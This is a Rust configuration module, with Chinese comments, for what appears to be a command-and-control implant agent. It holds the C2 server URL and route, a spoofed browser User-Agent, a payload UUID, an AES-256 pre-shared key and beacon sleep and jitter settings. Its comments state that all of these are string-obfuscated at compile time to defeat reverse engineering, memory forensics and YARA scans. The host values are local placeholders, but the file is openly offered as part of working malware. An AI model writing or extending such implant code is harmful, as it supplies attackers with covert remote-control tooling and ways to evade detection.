//! # 全局通信规格与运营控制中枢 (Global Operational Config & Presets)
//!
//! ## 机制与策略分离设计哲学 (Separation of Mechanism and Policy)
//!
//! 1. **策略中枢收敛**：
//!    - 将 C2 目标地址、URI 路由、User-Agent、初始 Payload UUID、加密主密钥等战术参数统一收敛于本模块；
//!    - 底层传输与协议模块（`crypto.rs`, `protocol.rs`, `transfer.rs`）不硬编码任何具体服务端业务参数。
//! 2. **编译期全量字符串混淆 (Zero Plaintext in `.rdata`)**：
//!    - 所有静态关键特征文本（如 URL、URI 路径、伪装 Header、初始 UUID）全量使用 [`obfstr::obfstr!`] 宏在调用者作用域就地解密；
//!    - 编译生成的 Release 二进制中绝不包含明文 C2 特征，有效免疫逆向分析、内存取证与静态 YARA 规则扫描。
//! 3. **零堆分配契约 (Zero-Heap OPSEC)**：
//!    - 通过宏展开或定长栈数组传递解密内容，不分配 `String`，用完即弃，杜绝在堆中驻留网络拓扑痕迹。

pub use obfstr::obfstr;

/// 默认基础心跳间隔 (秒)
pub const DEFAULT_SLEEP_INTERVAL: u64 = 10;

/// 默认心跳随机抖动率 (百分比: 0~100)
pub const DEFAULT_SLEEP_JITTER: u8 = 15;

/// 全局 C2 服务端 URL 宏展开 (支持直接作为参数调用或绑定到指定变量)
#[macro_export]
macro_rules! config_server_url {
    ($var:ident) => {
        $crate::obfstr::obfstr!(let $var = "http://127.0.0.1:8080";);
    };
    () => {
        $crate::obfstr::obfstr!("http://127.0.0.1:8080")
    };
}

/// 全局 C2 POST 路由宏展开 (支持直接作为参数调用或绑定到指定变量)
#[macro_export]
macro_rules! config_post_uri {
    ($var:ident) => {
        $crate::obfstr::obfstr!(let $var = "/api/v1/post";);
    };
    () => {
        $crate::obfstr::obfstr!("/api/v1/post")
    };
}

/// 全局 HTTP User-Agent 伪装头宏展开 (支持直接作为参数调用或绑定到指定变量)
#[macro_export]
macro_rules! config_user_agent {
    ($var:ident) => {
        $crate::obfstr::obfstr!(let $var = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36";);
    };
    () => {
        $crate::obfstr::obfstr!("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36")
    };
}

/// 全局初始 Payload UUID 宏展开 (支持直接作为参数调用或绑定到指定变量)
#[macro_export]
macro_rules! config_payload_uuid {
    ($var:ident) => {
        $crate::obfstr::obfstr!(let $var = "b50a5fe8-099d-4611-a2ac-96d93e6ec77b";);
    };
    () => {
        $crate::obfstr::obfstr!("b50a5fe8-099d-4611-a2ac-96d93e6ec77b")
    };
}

/// 全局 C2 服务器主机或 IP 宏展开 (支持直接作为参数调用或绑定到指定变量)
#[macro_export]
macro_rules! config_server_host {
    ($var:ident) => {
        $crate::obfstr::obfstr!(let $var = "127.0.0.1";);
    };
    () => {
        $crate::obfstr::obfstr!("127.0.0.1")
    };
}

/// 全局运营配置访问接口
pub struct AgentConfig;

impl AgentConfig {
    /// 获取 AES-256 初始预共享主密钥 (AESPSK: 32 字节栈数组)
    #[inline(always)]
    pub fn master_key() -> [u8; 32] {
        obfstr::obfstr!(let key_str = "01234567890123456789012345678901";);
        let mut key = [0u8; 32];
        key.copy_from_slice(key_str.as_bytes());
        key
    }

    /// 获取初始 36 字节 Payload UUID 栈字节数组
    #[inline(always)]
    pub fn payload_uuid_bytes() -> [u8; 36] {
        obfstr::obfstr!(let uuid_str = "b50a5fe8-099d-4611-a2ac-96d93e6ec77b";);
        let mut uuid = [0u8; 36];
        uuid.copy_from_slice(uuid_str.as_bytes());
        uuid
    }

    /// 获取 C2 服务端端口
    #[inline(always)]
    pub const fn server_port() -> u16 {
        8080
    }

    /// 获取是否使用 HTTPS
    #[inline(always)]
    pub const fn is_https() -> bool {
        false
    }

    /// 获取默认心跳休眠间隔 (秒)
    #[inline(always)]
    pub const fn default_sleep_interval() -> u64 {
        DEFAULT_SLEEP_INTERVAL
    }

    /// 获取默认心跳休眠抖动率 (百分比: 0~100)
    #[inline(always)]
    pub const fn default_sleep_jitter() -> u8 {
        DEFAULT_SLEEP_JITTER
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_config_obfuscated_values() {
        assert_eq!(config_server_url!(), "http://127.0.0.1:8080");
        assert_eq!(config_post_uri!(), "/api/v1/post");
        assert!(config_user_agent!().contains("Mozilla/5.0"));
        assert_eq!(config_payload_uuid!().len(), 36);

        config_server_url!(url_var);
        assert_eq!(url_var, "http://127.0.0.1:8080");

        assert_eq!(AgentConfig::master_key().len(), 32);
        assert_eq!(AgentConfig::payload_uuid_bytes().len(), 36);
    }
}
